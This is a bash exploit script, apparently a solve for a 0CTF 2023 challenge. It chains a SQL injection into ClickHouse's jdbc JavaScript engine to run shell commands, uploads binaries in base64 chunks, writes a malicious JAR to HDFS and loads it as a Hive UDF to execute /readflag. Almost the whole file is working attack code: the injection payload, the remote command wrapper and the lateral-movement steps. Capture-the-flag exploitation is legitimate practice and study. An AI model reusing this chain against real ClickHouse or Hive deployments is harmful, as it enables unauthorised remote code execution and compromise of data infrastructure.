#!/bin/bash

# HOST="http://x.instance.0ctf2023.ctf.0ops.sjtu.cn:18080/"
HOST="http://127.0.0.1:8080/"


# run command on remote, command will be run twice, probably due to multithreading
# usage: rcmd "whoami"
rcmd() {
    cmd=$1
    cmd=$(printf "$cmd" | sed "s/'/\\\\\\\x27/g") # escape ' ; don't ask me how many layers of encoding here
    curl -s -G "$HOST" --data-urlencode "query=0 UNION ALL SELECT results,'2','3','4' FROM jdbc('script', 'js', 'new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec([\'/bin/bash\', \'-c\', \'$cmd  2>&1\']).getInputStream())).readLine()') FORMAT JSON #";
}

# upload to remote
# usage: rupload "identifier" "./source" "/dst"
rupload() {
    identifier="$1"
    source="$2"
    dst="$3"

    dedupdir="/tmp/up_$identifier"

    cat "$source" | gzip -9 -c | base64 -w 6000 > "$identifier.gb64"

    rcmd "rm -rf $dst; rm -rf /tmp/$identifier.gb64; rm -rf $dedupdir; mkdir -p $dedupdir"

    while IFS="" read -r p || [ -n "$p" ]; do
    
        h=$(printf "$p" | md5sum | cut -d' ' -f1)
        
        while : ; do
            res=$(rcmd '[ ! -e '$dedupdir/$h' ] && touch '$dedupdir/$h' && echo "'$p'" >> /tmp/'$identifier.gb64)
            if [ "$res" != "[]" ]; then
                echo ""
                echo "error for block $h... retry..."
                echo "$res"
            else 
                printf "."
                break
            fi
        done

    done <"$identifier.gb64"

    rcmd 'base64 -d /tmp/'$identifier.gb64' | gzip -cd > '$dst
    rcmd 'sha256sum '$dst

}

# run clickhouse sql on remote, depends on /tmp/curl
# usage: rchsql "SELECT 123"
rchsql() {
    stmt=$1
    h=$(head -c 16 /dev/urandom | md5sum | cut -d' ' -f1)
    rcmd 'mkdir -p /tmp/sql && [ -e '/tmp/sql/$h' ] && cat '/tmp/sql/$h' || echo "'"$stmt"'" | /tmp/curl 0:8123 -s -d @- | tee '/tmp/sql/$h
}

if ! rcmd 'echo asdfghj' | grep -v php | grep 'asdfghj'; then
    echo "not ready"
    exit 1
fi

echo "Remote OK, starting.."


# step0: upload gohive (m) and curl (curl)
# d4f9770e46ae3f68f6088d593dc5b4d565d5899cb70cad4970b6115be22f3610  /tmp/m
rupload "m" "./gohive/m" "/tmp/m"
rcmd 'chmod +x /tmp/m'


# wget https://github.com/moparisthebest/static-curl/releases/download/v8.4.0/curl-amd64
# f19a1ca90973ee955ae8e933f10158b60e8b5a7ed553d099d119e1e2bafc4270  /tmp/curl
rupload "c" "./curl-amd64" "/tmp/curl"
rcmd 'chmod +x /tmp/curl'

# step2: execute clickhouse sql to create readflag.jar (rf.jar) on hdfs
rchsql 'DROP TABLE IF EXISTS kk'; sleep 3
rchsql 'CREATE TABLE kk(i Int32, s String) ENGINE=Memory'

cat "hive-custom-udf/readflag.jar" | base64 -w 512 > "readflag.jar.b64"
c=0
while IFS="" read -r p || [ -n "$p" ]; do
    rchsql "INSERT INTO kk VALUES($c,'$p')"
    c=$((c+1))
done <readflag.jar.b64

rchsql "SELECT count(*) FROM kk"
rchsql "SELECT sum(length(s)) FROM kk"

rfjar=$(head -c 16 /dev/urandom | md5sum | cut -d' ' -f1)

echo "jar: $rfjar.jar"

rchsql "DROP TABLE IF EXISTS jj"; sleep 3
rchsql "CREATE TABLE jj(s String) ENGINE=HDFS('hdfs://namenode:8020/tmp/$rfjar.jar', 'LineAsString')"
rchsql "INSERT INTO jj SELECT base64Decode(arrayStringConcat(groupArray(s))) FROM (SELECT s FROM kk ORDER BY i)"

# EFFE8D50F165EB7BCC302AC4FE4100B828C022301020F0C37776F5A1ED193D0D
rchsql "SELECT hex(SHA256(base64Decode(arrayStringConcat(groupArray(s))))) FROM (SELECT s FROM kk ORDER BY i)"

# step3: invoke gohive (/tmp/m) to run SQL to load UDF and execute shell command on hive
rcmd "/tmp/m"

rcmd "/tmp/m \"CREATE FUNCTION ex as 'com.sakthiinfotec.hive.custom.ToUpperCaseUDF' using jar 'hdfs://namenode:8020/tmp/$rfjar.jar'\" \"SELECT ex('/readflag')\""